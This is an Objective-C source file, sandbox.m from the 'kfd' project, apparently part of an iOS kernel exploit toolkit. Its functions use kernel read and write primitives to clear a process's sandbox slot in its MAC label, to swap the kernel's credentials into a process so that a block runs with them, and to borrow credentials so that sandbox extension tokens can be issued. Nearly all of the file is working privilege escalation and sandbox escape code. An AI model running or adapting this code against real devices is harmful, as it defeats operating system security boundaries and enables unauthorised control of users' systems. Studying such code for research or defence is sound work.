//
//  sandbox.m
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/08/19.
//

#import <Foundation/Foundation.h>
#import <stdbool.h>
#import "offsets.h"
#import "krw.h"
#import "sandbox.h"
#import "proc.h"
#import "escalate.h"
#import "stage2.h"

uint64_t get_ucred(uint64_t proc) {
    uint64_t ucred = 0;
    if(off_p_ucred == 0){
        uint64_t self_ro = kread64(proc + 0x20);
        printf("[DEBUG] self ro: 0x%llx\n", self_ro);
        uint64_t self_ucred = kread64(self_ro + 0x20);
        printf("[DEBUG] self ucred: 0x%llx\n", self_ucred); //ucred
        uint64_t kernproc = get_kernproc();
        printf("[DEBUG] Kernel proc: 0x%llx\n", kernproc);
        uint64_t kern_ro = kread64(kernproc + 0x20);
        printf("[DEBUG] Kernel ro: 0x%llx\n", kern_ro);
        uint64_t kern_ucred = kread64(kern_ro + 0x20);
        printf("[DEBUG] Kernel ucred: 0x%llx\n", kern_ucred); //kern_ucred
        uint64_t proc_set_ucred = off_proc_set_ucred;
        proc_set_ucred += get_kslide(); //proc_set_ucred
        printf("[DEBUG] Kernel set_ucred: 0x%llx\n", proc_set_ucred); //func:
        ucred = self_ucred;
        
    } else {
        ucred = kread64(proc + off_p_ucred);
    }
    return ucred;
}

uint64_t unsandbox(pid_t pid) {
    printf("[*] Unsandboxing pid %d\n", pid);
    
    uint64_t proc = proc_of_pid(pid); // pid's proccess structure on the kernel
    uint64_t ucred = get_ucred(proc); // pid credentials
    uint64_t cr_label = kread64(ucred + off_u_cr_label); // MAC label
    uint64_t orig_sb = kread64(cr_label + off_sandbox_slot);
    
    printf("[DEBUG] cr_label: 0x%llx\n", cr_label);
    printf("[DEBUG] orig_sb: 0x%llx\n", orig_sb);
    usleep(1000);
    
    kwrite64(cr_label + off_sandbox_slot /* First slot is AMFI's. so, this is second? */, 0); //get rid of sandbox by nullifying it
    
    return (kread64(kread64(ucred + off_u_cr_label) + off_sandbox_slot) == 0) ? orig_sb : NO;
}

void run_unsandboxed(void (^block)(void), pid_t pid) {
    uint64_t proc = proc_of_pid(pid);
    uint64_t self_ro = kread64(proc + 0x20);
    printf("[DEBUG] self ro: 0x%llx\n", self_ro);
    uint64_t self_ucred = kread64(self_ro + 0x20);
    printf("[DEBUG] self ucred: 0x%llx\n", self_ucred); //ucred
    uint64_t kernproc = get_kernproc();
    printf("[DEBUG] Kernel proc: 0x%llx\n", kernproc);
    uint64_t kern_ro = kread64(kernproc + 0x20);
    printf("[DEBUG] Kernel ro: 0x%llx\n", kern_ro);
    uint64_t kern_ucred = kread64(kern_ro + 0x20);
    printf("[DEBUG] Kernel ucred: 0x%llx\n", kern_ucred); //kern_ucred
    uint64_t proc_set_ucred = off_proc_set_ucred;
    proc_set_ucred += get_kslide(); //proc_set_ucred
    printf("[DEBUG] Kernel set_ucred: 0x%llx\n", proc_set_ucred); //func:
    kwrite64(proc, kern_ucred);
    block();
    kwrite64(proc, self_ucred);
}

BOOL sandbox(pid_t pid, uint64_t sb) {
    if (!pid) return NO;
    
    printf("[*] Sandboxing pid %d with slot at 0x%llx\n", pid, sb);
    
    uint64_t proc = proc_of_pid(pid); // pid's proccess structure on the kernel
    uint64_t ucred = get_ucred(proc); // pid credentials
    uint64_t cr_label = kread64(ucred + off_u_cr_label); /* MAC label */
    kwrite64(cr_label + off_sandbox_slot /* First slot is AMFI's. so, this is second? */, sb);
    
    return (kread64(kread64(ucred + off_u_cr_label) + off_sandbox_slot) == sb) ? YES : NO;
}

char* token_by_sandbox_extension_issue_file(const char *extension_class, const char *path, uint32_t flags) {
    uint64_t self_ucreds = borrow_ucreds(getpid(), 1);
    char *ret = sandbox_extension_issue_file(extension_class, path, flags);
    unborrow_ucreds(getpid(), self_ucreds);
    
    return ret;
}
